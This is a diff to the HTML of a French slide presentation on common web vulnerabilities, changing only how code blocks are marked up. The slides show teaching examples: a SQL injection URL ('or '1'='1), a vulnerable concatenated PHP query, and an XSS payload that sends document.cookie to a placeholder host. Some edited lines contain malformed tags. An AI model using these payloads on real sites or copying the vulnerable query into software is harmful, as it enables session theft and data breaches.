@@ -383,30 +383,30 @@
 
 				<section>
 					<h3>L’injection</h3>
-					<code><pre>SELECT * FROM client WHERE id='" . $_GET["id"] . "'</pre></code>
-					<code class="fragment"><pre>http://exemple.com/liste?id='or '1'='1</pre></code>
+					<pre><code>SELECT * FROM client WHERE id='" . $_GET["id"] . "'</code></pre>
+					<pre class="fragment"><code><pre>http://exemple.com/liste?id='or '1'='1</code></pre>
 				</section>
 
 				<section>
 					<h3>Violation de gestion d'authentification et de session</h3>
-					<code><pre>http://exemple.com/?jsessionid=A2938298D293</pre></code>
+					<pre><code>http://exemple.com/?jsessionid=A2938298D293</code></pre>
 				</section>
 
 				<section>
 					<h3>XSS</h3>
 					<p>Éxecution de code Javascript sans validation</p>
-					<code><pre>Votre Nom : <input type="text" name="nom" value="" /></pre></code>
-					<code class="fragment"><pre><script>alert("'echo $_POST["nom"];'");</script></pre></code>
-					<code class="fragment"><pre><script>window.location = 'https://www.exemple.com? cookie=' + document.cookie</script></pre></code>
+					<pre><code>Votre Nom : <input type="text" name="nom" value="" /></code></pre>
+					<pre class="fragment"><code><pre>script>alert("'echo $_POST["nom"];'");</script></code></pre>
+					<pre class="fragment"><code><pre>script>window.location = 'https://www.exemple.com? cookie=' + document.cookie</script></code></pre>
 				</section>
 
 				<section>
 					<h3>Référence directes non sécurisées à un objet</h3>
-					<code><pre>http://exemple.com/liste?mode=client</pre></code>
+					<pre><code>http://exemple.com/liste?mode=client</code></pre>
 					<div class="fragment">
 						<p>Si je change client par … admin ?</p>
-						<code><pre>SELECT * FROM client where mode=?</pre></code>
-						<code><pre>$stmt->bindParam(1, $mode);</pre></code>
+						<pre><code>SELECT * FROM client where mode=?</code></pre>
+						<pre><code>$stmt->bindParam(1, $mode);</code></pre>
 					</div>
 				</section>
 
